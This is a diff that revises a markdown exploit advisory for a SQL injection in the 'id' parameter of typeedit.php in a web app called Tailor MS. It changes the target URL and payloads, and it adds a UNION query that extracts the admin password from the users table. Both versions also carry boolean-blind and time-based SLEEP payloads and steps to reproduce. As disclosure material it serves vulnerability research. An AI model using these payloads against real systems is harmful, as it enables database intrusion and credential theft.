@@ -1,4 +1,4 @@
-# Exploit Title: Tailor MS – SQL Injection in typeedit.php (`http://localhost/tailor/typeedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in typeedit.php (`http://localhost:8000/typeedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +20,31 @@ A SQL Injection vulnerability exists in the `typeedit.php` endpoint of **Tailor 
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/typeedit.php?id=1`
+- **URL:** `http://localhost:8000/typeedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `typeedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-  - **Payload:** `id=1' AND 4373=(SELECT (CASE WHEN (4373=4373) THEN 4373 ELSE (SELECT 7810 UNION SELECT 5716) END))-- -`
+  - **Payload:** `id=1' AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 1111 UNION SELECT 2222) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-  - **Payload:** `id=1' AND (SELECT 6908 FROM (SELECT(SLEEP(5)))hqTM)-- YUQv`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 2 columns
-  - **Payload:** 
-```
-id=-6647' UNION ALL SELECT CONCAT(0x7170787171,0x5870434f6f7249516d55544c7071586d7654637a535569424a4b587a66465a756764627875694964,0x717a6a7a71),NULL-- -
-```
+  - **Payload:** `id=1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))abcd)-- efgh`
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password
+  - **Payload:**  
+    ```
+    http://localhost:8000/typeedit.php?id=-1' union select password from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +64,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/typeedit.php?id=1`.  
+1. Browse to `http://localhost:8000/typeedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `typeedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +74,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
